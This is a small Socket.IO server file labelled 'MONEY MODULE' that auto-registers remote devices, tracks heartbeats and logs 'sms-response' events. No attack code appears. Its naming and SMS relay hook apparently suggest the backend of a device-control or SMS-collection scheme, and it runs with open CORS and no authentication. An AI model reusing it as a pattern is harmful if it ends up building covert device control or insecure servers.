/**
 * MONEY MODULE - Socket.IO Server
 * Deploy this on Railway, Render, or any VPS
 */

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  },
  transports: ['websocket', 'polling']
});

// Store connected devices
const connectedDevices = new Map();
const registeredDevices = new Map();

// Health check endpoint
app.get('/', (req, res) => {
  res.json({
    status: 'online',
    message: 'MONEY MODULE Server Running',
    connectedDevices: connectedDevices.size,
    registeredDevices: registeredDevices.size,
    uptime: process.uptime()
  });
});

// Socket.IO connection handling
io.on('connection', (socket) => {
  console.log(`[CONNECT] New connection: ${socket.id}`);
  
  // Get device info from auth
  const deviceId = socket.handshake.auth?.deviceId || 'unknown';
  
  console.log(`[AUTH] Device ID: ${deviceId}`);
  
  // Store connection
  connectedDevices.set(socket.id, {
    deviceId,
    socketId: socket.id,
    connectedAt: new Date().toISOString()
  });
  
  // AUTO-REGISTER from auth
  if (deviceId && deviceId !== 'unknown') {
    registeredDevices.set(deviceId, {
      deviceId: deviceId,
      socketId: socket.id,
      registeredAt: new Date().toISOString(),
      lastSeen: new Date().toISOString()
    });
    console.log(`[REGISTERED] Device: ${deviceId}`);
  }
  
  // Send confirmation
  socket.emit('connected', {
    message: 'Connected to server',
    deviceId: deviceId,
    socketId: socket.id
  });
  
  // Handle heartbeat
  socket.on('heartbeat', (data) => {
    if (registeredDevices.has(deviceId)) {
      const device = registeredDevices.get(deviceId);
      device.lastSeen = new Date().toISOString();
      registeredDevices.set(deviceId, device);
    }
    socket.emit('heartbeat', { timestamp: Date.now() });
  });
  
  // Handle SMS response
  socket.on('sms-response', (data) => {
    console.log(`[SMS-RESPONSE] From ${deviceId}`);
  });
  
  // Handle disconnect
  socket.on('disconnect', (reason) => {
    console.log(`[DISCONNECT] ${deviceId}: ${reason}`);
    connectedDevices.delete(socket.id);
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log('MONEY MODULE Server Started on port ' + PORT);
});
